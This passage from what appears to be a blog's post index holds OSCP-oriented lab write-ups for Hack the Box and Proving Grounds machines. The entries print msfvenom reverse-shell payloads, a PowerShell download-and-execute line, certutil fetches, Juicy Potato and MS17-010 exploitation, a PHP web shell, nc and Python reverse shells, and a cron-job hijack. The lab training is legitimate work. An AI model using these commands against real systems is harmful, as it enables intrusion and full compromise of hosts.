reverse shell payload as the SYSTEM account.Trigger the exploit by running the following command on the machine:PS:\\&gt; IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.10/Invoke-MS16032.ps1')When we check on our HTTP Server we see two requests, one for Invoke-MS16032.ps1 and one for Invoke-PowerShellTcp.ps1When we check on our listener, we see we’ve have caught a shell running as the SYSTEM user" }, { "title": "Hack the Box - Devel", "url": "/posts/Devel/", "categories": "Hack the Box", "tags": "oscp, windows", "date": "2022-08-16 18:42:00 -0500", "snippet": "Devel OverviewMachine Details IP Hostname Operating System 10.10.10.5 Devel Windows Path to ExploitationOn this machine, we will take advantage of a convenient FTP server that accepts anonymous logins and is placed directly in the website’s root directory. Then we’ll take advantage of our local user’s permissions and use the Juicy Potato exploit to elevate our privileges to SYSTEM.EnumerationFull Port Scannmap 10.10.10.5 -p- -oA Devel/nmap/full-port --open -Pn -vvResults: PORT SERVICE 21 ftp 80 http Service Scannmap 10.10.10.5 -p 21,80 -sC -sV -oA Devel/nmap/service-scan -PnResults: PORT SERVICE VERSION 21 ftp ftpd 80 http IIS httpd 7.5 FTPWe see we have anonymous access to the FTP serverWhich appears to be the root directory of an IIS server. We can try to leverage this to gain a shell by uploading a payload to the website.Shell on HostCreate the reverse shell payload$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.10 LPORT=443 -f aspx -o evil.aspxUpload the file to the FTP serverSetup a listener and navigate to the payload on the web serverWe see we got a shell as the web userLocal EnumerationUsername EnumerationC:\\&gt; whoami /privSystem InformationC:\\&gt; systeminfoWe can consider using the Juicy Potato exploitPrivilege EscalationGenerate the reverse shell payload$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.10 LPORT=443 -f exe -o evil.exeUpload the juicy potato exploit file and the reverse shell payload to the hostC:\\&gt; certutil -urlcache -f http://10.10.14.10/juicypotato.exe juicy.exeC:\\&gt; certutil -urlcache -f http://10.10.14.10/evil.exe evil.exesetup a listener and execute the exploitC:\\&gt; juicy.exe -l 1337 -p C:\\tmp\\evil.exe -t * -c {6d18ad12-bde3-4393-b311-099c346e6df9}Checking back on the listener we see we have a shell running as the SYSTEM account" }, { "title": "Hack the Box - Blue", "url": "/posts/Blue/", "categories": "Hack the Box", "tags": "oscp, windows", "date": "2022-08-15 19:30:00 -0500", "snippet": "Blue OverviewMachine Details IP Hostname Operating System 10.10.10.40 Blue Windows Path to ExploitationWe leverage the host’s vulnerability to MS17-010 to fully compromise the host.EnumerationFull Port Scannmap 10.10.10.40 -p- -oA Blue/nmap/full-port --open -Pn -vvResults: PORT SERVICE 135 msrpc 139 netbios-ssn 445 microsoft-ds 49152 unknown 49153 unknown 49154 unknown 49155 unknown 49156 unknown 49157 unknown Service Scannmap 10.10.10.40 -p 135,139,445,49152,49153,49154,49155,49156,49157 -sC -sV -oA Blue/nmap/service-scan -PnResults: PORT SERVICE VERSION 135 msrpc Windows RPC 139 netbios-ssn Windows netbios-ssn 445 microsoft-ds 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP) 49152 msrpc Windows RPC 49153 msrpc Windows RPC 49154 msrpc Windows RPC 49155 msrpc Windows RPC 49156 msrpc Windows RPC 49157 msrpc Windows RPC SMBSMB Nmap Scan$ nmap -p 139,445 --script=smb-vuln* 10.10.10.40 -Pn -oA nmap/smb-scan| smb-vuln-ms17-010: | VULNERABLE:| Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)| State: VULNERABLE| IDs: CVE:CVE-2017-0143| Risk factor: HIGH| A critical remote code execution vulnerability exists in Microsoft SMBv1| servers (ms17-010).We see the host is vulnerable to MS17-010Exploitation and Privilege EscalationWe can use the send_and_execute.py script to attack the machine.Use the checker.py script to identify the named pipes available$ python checker.py 10.10.10.40We can try supplying the guest username to the script and seeing if we get different results.$ python checker.py 10.10.10.40We can now try executing the send_and_execute.py script using the guest user.$ python send_and_execute.py 10.10.10.40 evil.exe 445We now have a shell on the machine as the SYSTEM account" }, { "title": "Hack the Box - Legacy", "url": "/posts/Legacy/", "categories": "Hack the Box", "tags": "oscp, windows", "date": "2022-08-15 14:45:00 -0500", "snippet": "Legacy OverviewMachine Details IP Hostname Operating System 10.10.10.4 Legacy Windows Path to ExploitationThis box has a very straight-forward path to exploitation. We leverage the Eternal Blue vulnerability to grant us full access to the machine.EnumerationFull Port Scannmap -p- -Pn 10.10.10.3 -oA nmap/full-port Results: PORT STATE SERVICE 135 open msrpc 139 open netbios-ssn 445 open microsoft-ds Service Scannmap -p 135,139,445 -sC -sV -oA Legacy/nmap/service-scan -Pn 10.10.10.4Results: PORT STATE SERVICE VERSION 135 open msrpc Microsoft Windows RPC 139 open netbios-ssn Microsoft Windows netbios-ssn 445 open microsoft-ds Windows XP microsoft-ds SMB Scannmap -p 135,139,445 -sC -sV -oA Legacy/nmap/service-scan -Pn 10.10.10.4Results:Host is vulnerable to MS08-67 and MS17-010Exploitation and Privilege EscalationWe can use the send_and_execute.py script to launch our reverse shell on the hostFirst we need to generate our reverse shell payloadmsfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 -f exe-service -o evil.exeThen use the script to execute itpython /opt/MS17-010/send_and_execute.py 10.10.10.4 evil.exeWe see we have a shell running on the host" }, { "title": "Proving Grounds - Zino", "url": "/posts/Zino/", "categories": "Proving Grounds", "tags": "oscp, linux", "date": "2022-08-09 22:45:00 -0500", "snippet": "Zino OverviewMachine Details IP Hostname Operating System 192.168.x.64 Zino Linux Path to ExploitationThis is a Linux machine running an HTTP server and has SSH available. We will identify the vulnerable web-application and using a publicly available exploit and default credentials we obtain a web-shell and get command execution. Once on the machine we identify a scheduled script that takes uploaded images and executes the exiftools command on them. We can leverage this by uploading a .jpg file with an embedded reverse shell payload.EnumerationFull Port Scan$ nmap -p- -Pn -oA nmap/full-port --open 192.168.200.64Results: Port Service 21 ftp 22 ssh 139 netbios-ssn 445 microsoft-ds 3306 mysql 8003 mcreport Service Scan$ nmap -p 21,22,139,445,3306,8003 -Pn -sC -sV -oA nmap/service-scan 192.168.200.64Results: Port Service Version 21 ftp vsftpd 3.0.3 22 ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) 139 netbios-ssn smbd 3.X - 4.X 445 microsoft-ds smbd 4.9.5-Debian 3306 mysql   8003 http Apache httpd 2.4.38 SMB EnumerationSMB Scannmap -p 139,445 --script=smb-vuln* 192.168.200.64 -Pn -oA nmap/smb-scanResults:| smb-vuln-regsvc-dos: | VULNERABLE:| Service regsvc in Microsoft Windows systems vulnerable to denial of service| State: VULNERABLE| The service regsvc in Microsoft Windows 2000 systems is vulnerable to denial of service caused by a null deference| pointer. This script will crash the service if it is vulnerable. This vulnerability was discovered by Ron Bowes| while working on smb-enum-sessions.|_ |_smb-vuln-ms10-061: false|_smb-vuln-ms10-054: falseNo applicable vulnerabilities, but we have gathered more information from the previous service scan| smb-os-discovery: | OS: Windows 6.1 (Samba 4.9.5-Debian)| Computer name: zino| NetBIOS computer name: ZINO\\x00| Domain name: \\x00| FQDN: zino|_ System time: 2022-06-09T20:21:56-04:00SMB Share EnumerationUsing enum4linux we see that the host does not accept null sessions ======================================= | Session Check on 192.168.49.200 | ======================================= [E] Server doesn't allow session using username '', password ''. Aborting remainder of tests.We can try enumeration the shares with the computer name ‘zino’ with no passwordWe see that there is a directory called zino, we can try to access that share.It appears that this is the home directory of the zino user.File EnumerationThe content of the auth.log file provides us with a valid usernameIn the misc.log file we find application credentialsadmin:adminadminThese credentials allow us to login to application running on the HTTP ServerWebsite EnumerationThere is a /booked/ directory on the sitewhich leads to the following login pageWe also see the software version near the bottom of the pageThis version is vulnerable to an Authenticated RCEWith the credentials identified from enumerating the SMB share(admin:adminadmin)ExploitationWe can attempt to exploit this service with the RCE exploit.When using the exploit, I was unable to successfully exploit the RCE, but followed the steps outlined hereGaining a Webshell Navigate to: http://192.168.200.64:8003/booked/Web/admin/manage_theme.php Create the rce.php file with the following content:&lt;?php system($_GET['cmd']); ?&gt; Upload the php file to the favicon section of the site navigate to http://192.168.200.64:8003/booked/Web/custom-favicon.php?cmd=whoami Shell on ZinoUsing the webshell we identify that nc is on the host.We can use that to get our reverse shell. Use the following command to launch our reverse shell:nc 192.168.49.200 8003 -e /bin/bashChecking on our listener we see the connection come throughPrivilege EscalationLinpeas has identified a potential priv esc in a cron job running in /var/www/html/bookedWe can modify the content of the file to be the following:#!/usr/bin/env pythonimport osimport systry: os.system('nc -e /bin/bash 192.168.49.200 8003')except: print 'ERROR...'sys.exit(0)and copy it to /var/www/html/booked/cleanup.py and setup our listener. After a while we see a connection and we confirm we are running as root" }, { "title": "AutoBox Bash Script", "url": "/posts/Autobox/", "categories": "Projects", "tags": "bash, automation, linux", "date": "2022-08-09 11:20:00 -0500", "snippet": "AutoBox Bash ScriptI got tired of running the same commands over and over again and decided to automate first few steps when starting on a new pentest lab machine. I create Autobox to create a directory named after the machine I’m attacking as well create several sub-directories to help organize my files while working.AutoBox GitHubThe script currently accepts two total arguments: The name of the machine The IP of the machineIt will then run a full port scan nmap against the host, save the output, extract the open ports, run an nmap service scan (-sV -sC), and finally save the output of the commands to local files and generate markdown files to help organize note-taking.I also added a little scp command that prints after the script completes to help move the files to another machine if need be (I take my notes on my Windows machine, but work in a Kali VM, so this is really helpful for me)Usage$ ./AutoBox.sh [MACHINE]It will then prompt for the IP of the machineIt will create a directory within your current working directory named after the machine name given, inside this directory it creates several subdirectories: nmap: The nmap commands store their outputs here enumeration: A place to store your enumeration tools output shell: Files and methods required to gain a foothold on the machine priv-esc: Files and methods required to escalate privileges on the machineThe script also creates template markdown files for each step of in the attack chainRendered ExampleFuture UpgradesI want to add more logic to the script to run more enumeration commands depending on the services identified, specifically: SMB enum4linux nmap SMB vuln scan smbmap HTTP Directory Bruteforce Nikto " }, { "title": "Proving Grounds - Exfiltrated", "url": "/posts/Exfiltrated/", "categories": "Proving Grounds", "tags": "oscp, linux", "date": "2022-08-08 12:37:00 -0500", "snippet": "Exfiltrated OverviewMachine Details IP Hostname Operating System 192.168.x.163 Exfiltrated Linux Path to ExploitationThis is a Linux machine running an HTTP server and has SSH available. We will identify the vulnerable web-application and using a publicly available exploit and default credentials we obtain a web-shell and get command execution. Once on the machine we identify a scheduled script that takes uploaded images and executes the exiftools command on them. We can leverage this by uploading a .jpg file with an embedded reverse shell payload.EnumerationFull Port Scan$ nmap 192.168.109.163 -p- -oA Exfiltrated/nmap/full-port --open -Pn -vvResults: PORT SERVICE 22 ssh 80 http Service Scan$ nmap 192.168.109.163 -p 22,80 -sC -sV -oA Exfiltrated/nmap/service-scan -PnResults: PORT SERVICE VERSION 22 ssh 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) 80 http httpd 2.4.41 ((Ubuntu)) Website EnumerationWe see the server is running Subrion CMS 4.2.1 which has an Authenticated RCE. We can guess the default credentials admin:admin and see that we can now login to the applicationWe can now use the exploit and supply it the credentials for the application$ python3 exploit.py -u http://192.168.109.163/panel/ -l admin -p admin And we see that we have command execution on the boxWe can get a reverse shell by setting up a listener and running the following python commandpython3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.49.109\",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'Privilege EscalationWe inspect the content of /opt/image-exif.sh and see the following code.We see that the code is taking images from the site’s upload directory and running exiftools on it. We can inject a malicious command into a jpg file attempt to get a reverse shell when exfitools executes. We can use the exploit located here to generate our malicious jpg.$ python3 exif-exploit.py -s 192.168.49.109 443We now upload our image to the site’s upload directory, setup a listener and wait to catch the shellAnd we now have a root shell" } ]
